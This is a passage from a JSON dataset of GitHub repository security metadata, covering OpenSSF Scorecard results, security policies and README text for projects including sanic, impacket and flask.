        "num_forks": 1549,
        "num_subscribers": 404,
        "SecurityPolicy_created_at": "2019-05-23 20:58:15",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "82c5529f92e94348bf76b643c8b204dcb77f8bfd",
                "url": "https://github.com/sanic-org/sanic/commit/82c5529f92e94348bf76b643c8b204dcb77f8bfd",
                "date": "2023-12-31 09:30:54"
            },
            {
                "commit_id": "4ad8168bb016cef19213cd3db2b12efb1a4dcb30",
                "url": "https://github.com/sanic-org/sanic/commit/4ad8168bb016cef19213cd3db2b12efb1a4dcb30",
                "date": "2022-12-27 14:50:36"
            },
            {
                "commit_id": "97f33f42df7ba34e90f8622f74b8e265deef6ee4",
                "url": "https://github.com/sanic-org/sanic/commit/97f33f42df7ba34e90f8622f74b8e265deef6ee4",
                "date": "2022-10-25 10:05:13"
            },
            {
                "commit_id": "ab5a7038af95f16b9170aae49ab8ca6109dfb647",
                "url": "https://github.com/sanic-org/sanic/commit/ab5a7038af95f16b9170aae49ab8ca6109dfb647",
                "date": "2022-08-17 07:42:22"
            },
            {
                "commit_id": "6009e6d35d1185dcb00465ed92f70bf87a41689b",
                "url": "https://github.com/sanic-org/sanic/commit/6009e6d35d1185dcb00465ed92f70bf87a41689b",
                "date": "2021-01-28 09:54:07"
            },
            {
                "commit_id": "7b7559309da3dbeb5889320fd060a8be4a3a133a",
                "url": "https://github.com/sanic-org/sanic/commit/7b7559309da3dbeb5889320fd060a8be4a3a133a",
                "date": "2020-09-30 12:38:08"
            },
            {
                "commit_id": "18cd4caf707054217aa020c676b3ccd029244fb6",
                "url": "https://github.com/sanic-org/sanic/commit/18cd4caf707054217aa020c676b3ccd029244fb6",
                "date": "2019-05-23 20:58:15"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "fortra/impacket",
        "project_url": "https://github.com/fortra/impacket",
        "SSF": {
            "date": "2024-10-29T22:56:53+07:00",
            "repo": {
                "name": "github.com/fortra/impacket",
                "commit": "835e17550b57606ee3c681ae1c3f0edea096ec19"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: branch 'master' does not require approvers",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "9 out of 12 merged PRs checked by a CI test -- score normalized to 7",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 4,
                    "reason": "Found 12/30 approved changesets -- score normalized to 4",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: motioneye-project contributor org/company found, christian clauss contributor org/company found, www.airbus.com/en/defence contributor org/company found, redhatofficial contributor org/company found, tenable contributor org/company found, my personal account contributor org/company found, podalirius labs contributor org/company found, TheAlgorithms contributor org/company found, synacktiv contributor org/company found, streetcomplete contributor org/company found, outsider security contributor org/company found, hyprcorp contributor org/company found, QuokkaLight contributor org/company found, Tipi-Hack contributor org/company found, Pythonista-Tools contributor org/company found, red hat contributor org/company found, cakebox contributor org/company found, d120 contributor org/company found, TandilSec contributor org/company found, ThePorgs contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 20 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 3 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:62: update your workflow using https://app.stepsecurity.io/secureworkflow/fortra/impacket/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:65: update your workflow using https://app.stepsecurity.io/secureworkflow/fortra/impacket/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/fortra/impacket/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/fortra/impacket/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/fortra/impacket/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/labeler.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/fortra/impacket/labeler.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: Dockerfile:1",
                        "Warn: containerImage not pinned by hash: Dockerfile:10: pin your Docker image by updating python:3.8-alpine to python:3.8-alpine@sha256:3d93b1f77efce339aa77db726656872517b0d67837989aa7c4b35bd5ae7e81ba",
                        "Warn: pipCommand not pinned by hash: Dockerfile:4",
                        "Warn: pipCommand not pinned by hash: Dockerfile:8",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_and_test.yml:30",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_and_test.yml:71",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build_and_test.yml:72",
                        "Info:   0 out of   5 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 containerImage dependencies pinned",
                        "Info:   0 out of   5 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 12 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact impacket_0_12_0 not signed: https://api.github.com/repos/fortra/impacket/releases/175303936",
                        "Warn: release artifact impacket_0_11_0 not signed: https://api.github.com/repos/fortra/impacket/releases/113852923",
                        "Warn: release artifact impacket_0_10_0 not signed: https://api.github.com/repos/fortra/impacket/releases/66029694",
                        "Warn: release artifact impacket_0_9_24 not signed: https://api.github.com/repos/fortra/impacket/releases/52086696",
                        "Warn: release artifact impacket_0_9_23 not signed: https://api.github.com/repos/fortra/impacket/releases/44354326",
                        "Warn: release artifact impacket_0_12_0 does not have provenance: https://api.github.com/repos/fortra/impacket/releases/175303936",
                        "Warn: release artifact impacket_0_11_0 does not have provenance: https://api.github.com/repos/fortra/impacket/releases/113852923",
                        "Warn: release artifact impacket_0_10_0 does not have provenance: https://api.github.com/repos/fortra/impacket/releases/66029694",
                        "Warn: release artifact impacket_0_9_24 does not have provenance: https://api.github.com/repos/fortra/impacket/releases/52086696",
                        "Warn: release artifact impacket_0_9_23 does not have provenance: https://api.github.com/repos/fortra/impacket/releases/44354326"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/build_and_test.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/labeler.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-m2qf-hxjv-5gpq / PYSEC-2023-62"
                    ],
                    "score": 9,
                    "reason": "1 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/fortra/impacket/contents/SECURITY.md",
        "SecurityPolicy_content": "Security Policy\n===============\n\nAlthough this initiative is not meant to be used in productive environments,\nif you consider that you have identified an issue that might affect the\nsecurity of its users, or you understand that the tool is being abused,\nyou can contact us at https://www.coresecurity.com/about/contact.\n",
        "project_all_labels": [
            "bug",
            "CI/CD & Tests",
            "CI/DI & Tests",
            "duplicate",
            "enhancement",
            "Examples",
            "feature",
            "help wanted",
            "high",
            "in review",
            "invalid",
            "ipv6_support",
            "Library",
            "low",
            "medium",
            "on hold",
            "py_issue",
            "question",
            "Setup",
            "unicode_issue",
            "waiting for response",
            "wont fix",
            "wont merge"
        ],
        "README_content": "Impacket\n========\n\n[![Latest Version](https://img.shields.io/pypi/v/impacket.svg)](https://pypi.python.org/pypi/impacket/)\n[![Build and test Impacket](https://github.com/fortra/impacket/actions/workflows/build_and_test.yml/badge.svg)](https://github.com/fortra/impacket/actions/workflows/build_and_test.yml)\n\nCopyright Fortra, LLC and its affiliated companies. All rights reserved.\n\nImpacket was originally created by [SecureAuth](https://www.secureauth.com/labs/open-source-tools/impacket), and now maintained by Fortra's Core Security.\n\nImpacket is a collection of Python classes for working with network\nprotocols. Impacket is focused on providing low-level\nprogrammatic access to the packets and for some protocols (e.g.\nSMB1-3 and MSRPC) the protocol implementation itself.\nPackets can be constructed from scratch, as well as parsed from \nraw data, and the object-oriented API makes it simple to work with \ndeep hierarchies of protocols. The library provides a set of tools\nas examples of what can be done within the context of this library.\n\nWhat protocols are featured?\n----------------------------\n\n * Ethernet, Linux \"Cooked\" capture.\n * IP, TCP, UDP, ICMP, IGMP, ARP.\n * IPv4 and IPv6 Support.\n * NMB and SMB1, SMB2 and SMB3 (high-level implementations).\n * MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP.\n * Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys.\n * Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, BKRP, DHCPM, EVEN6, MGMT, SASEC, TSCH, DCOM, WMI, OXABREF, NSPI, OXNSPI.\n * Portions of TDS (MSSQL) and LDAP protocol implementations.\n \nMaintainer\n==========\n\n[Core Security](https://www.coresecurity.com/)\n\n\nTable of Contents\n=================\n\n* [Getting Impacket](#getting-impacket)\n* [Setup](#setup)\n* [Testing](#testing)\n* [Licensing](#licensing)\n* [Disclaimer](#disclaimer)\n* [Contact Us](#contact-us)\n\nGetting Impacket\n================\n\n### Latest version\n\n* Impacket v0.12.0\n\n  [![Python versions](https://img.shields.io/pypi/pyversions/impacket.svg)](https://pypi.python.org/pypi/impacket/)\n\n[Current and past releases](https://github.com/fortra/impacket/releases)\n\n### Development version\n\n* Impacket v0.13.0-dev (**[master branch](https://github.com/fortra/impacket/tree/master)**)\n\n  [![Python versions](https://img.shields.io/badge/python-3.8%20|%203.9%20|%203.10%20|%203.11%20|%203.12-blue.svg)](https://github.com/fortra/impacket/tree/master)\n\n\nSetup\n=====\n\n### Quick start\n\n> :information_source: We recommend using `pipx` over `pip` for system-wide installations.\n\nIn order to grab the latest stable release run:\n\n    python3 -m pipx install impacket\n\nIf you want to play with the unreleased changes, download the development \nversion from the [master branch](https://github.com/fortra/impacket/tree/master),\nextract the package, and execute the following command from the\ndirectory where Impacket has been unpacked:\n\n    python3 -m pipx install .\n\n### Docker Support\n\nBuild Impacket's image:\n\n      $ docker build -t \"impacket:latest\" .\n\nUsing Impacket's image:\n\n      $ docker run -it --rm \"impacket:latest\"\n\nTesting\n=======\n\nThe library leverages the [pytest](https://docs.pytest.org/) framework for organizing\nand marking test cases, [tox](https://tox.readthedocs.io/) to automate the process of\nrunning them across supported Python versions, and [coverage](https://coverage.readthedocs.io/)\nto obtain coverage statistics.\n\nA [comprehensive testing guide](TESTING.md) is available.\n\n\nLicensing\n=========\n\nThis software is provided under a slightly modified version of\nthe Apache Software License. See the accompanying [LICENSE](LICENSE) file for\nmore information.\n\nSMBv1 and NetBIOS support based on Pysmb by Michael Teo.\n\nDisclaimer\n==========\n\nThe spirit of this Open Source initiative is to help security researchers,\nand the community, speed up research and educational activities related to\nthe implementation of networking protocols and stacks.\n\nThe information in this repository is for research and educational purposes\nand not meant to be used in production environments and/or as part\nof commercial products.\n\nIf you desire to use this code or some part of it for your own uses, we\nrecommend applying proper security development life cycle and secure coding\npractices, as well as generate and track the respective indicators of\ncompromise according to your needs.\n\n\nContact Us\n==========\n\nWhether you want to report a bug, send a patch, or give some suggestions\non this package, reach out to us at https://www.coresecurity.com/about/contact.\n\nFor security-related questions check our [security policy](SECURITY.md).\n",
        "num_commits": 4040,
        "project_age_days": 3485,
        "project_created_at": "2015-04-15",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-24",
        "num_contributors": 188,
        "num_pull": 867,
        "num_issues": 1828,
        "num_opening_issue": 346,
        "project_size(kB)": 8706,
        "num_stargazers": 13480,
        "num_watchers": 13480,
        "num_forks": 3567,
        "num_subscribers": 374,
        "SecurityPolicy_created_at": "2021-06-11 14:25:16",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "157fb0a299451541c8e8f7c9f234abaf6246d5d4",
                "url": "https://github.com/fortra/impacket/commit/157fb0a299451541c8e8f7c9f234abaf6246d5d4",
                "date": "2022-12-14 19:44:37"
            },
            {
                "commit_id": "1a5ed9dc2160c154c851e85066dfb72882f5a473",
                "url": "https://github.com/fortra/impacket/commit/1a5ed9dc2160c154c851e85066dfb72882f5a473",
                "date": "2021-06-11 14:25:16"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "pallets/flask",
        "project_url": "https://github.com/pallets/flask",
        "SSF": {
            "date": "2024-10-29T22:33:58+07:00",
            "repo": {
                "name": "github.com/pallets/flask",
                "commit": "e8b91cd38aadafdf733558bbcea4810fa65bb849"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Warn: could not determine whether codeowners review is allowed",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Warn: PRs are not required to make changes on branch 'main'; or we don't have data to detect it.If you think it might be the latter, make sure to run Scorecard with a PAT or use Repo Rules (that are always public) instead of Branch Protection settings"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "3 out of 4 merged PRs checked by a CI test -- score normalized to 7",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 2/26 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: dreamsspace contributor org/company found, borgbackup contributor org/company found, avast contributor org/company found, codekitchen-community contributor org/company found, PyCQA contributor org/company found, cern / @indico contributor org/company found, conda-forge contributor org/company found, Kozea contributor org/company found, apiflask contributor org/company found, realm of light contributor org/company found, cljdoc contributor org/company found, pocoo contributor org/company found, remotestorage contributor org/company found, helloflask contributor org/company found, servo contributor org/company found, lens contributor org/company found, python-trio contributor org/company found, green river contributor org/company found, IRkernel contributor org/company found, rust-lang-nursery contributor org/company found, austrianredcross contributor org/company found, iron contributor org/company found, personalrobotics contributor org/company found, discorporate contributor org/company found, theislab contributor org/company found, indico contributor org/company found, cn contributor org/company found, authlib contributor org/company found, home-faerie contributor org/company found, aigc-studio contributor org/company found, hsiaoming contributor org/company found, autoinvent contributor org/company found, actix contributor org/company found, kennethreitz-archive contributor org/company found, snoplus contributor org/company found, recursecenter contributor org/company found, pimutils contributor org/company found, FactoryBoy contributor org/company found, github contributor org/company found, python-zk contributor org/company found, houst contributor org/company found, pallets-eco contributor org/company found, getsentry contributor org/company found, python-babel contributor org/company found, zalando se contributor org/company found, CERN contributor org/company found, wtforms contributor org/company found, sopython contributor org/company found, python-http contributor org/company found, facebook contributor org/company found, shackspace contributor org/company found, tinyerp contributor org/company found, NixOS contributor org/company found, lord63-forks contributor org/company found, pallets contributor org/company found, flaskcwg contributor org/company found, sabre-io contributor org/company found, PyConChina contributor org/company found, nsupdate-info contributor org/company found, scverse contributor org/company found, click-contrib contributor org/company found, msmvps contributor org/company found, GameSurge contributor org/company found, typlog contributor org/company found, moinwiki contributor org/company found, FlaskCon contributor org/company found, python contributor org/company found, lektor contributor org/company found, python-hyper contributor org/company found, microsoft contributor org/company found, sentry contributor org/company found, dell contributor org/company found, dependabot contributor org/company found, coast-framework contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 74 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 8 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish.yaml:55"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing shell code: invalid parameter name: .github/workflows/tests.yaml:36",
                        "Warn: pipCommand not pinned by hash: .devcontainer/on-create-command.sh:5",
                        "Warn: pipCommand not pinned by hash: .devcontainer/on-create-command.sh:6",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish.yaml:19",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yaml:36",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yaml:52",
                        "Info:  12 out of  12 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   5 out of   5 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   5 pipCommand dependencies pinned"
                    ],
                    "score": 5,
                    "reason": "dependency not pinned by hash detected -- score normalized to 5",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 8 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/pallets/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/pallets/.github/SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: github.com/pallets/.github/SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/flask/releases/assets/160813583",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/flask/releases/assets/149637381",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/flask/releases/assets/146388022",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/flask/releases/assets/128454404",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/flask/releases/assets/122480844"
                    ],
                    "score": 10,
                    "reason": "5 out of the last 5 releases have a total of 5 signed artifacts.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/publish.yaml:32",
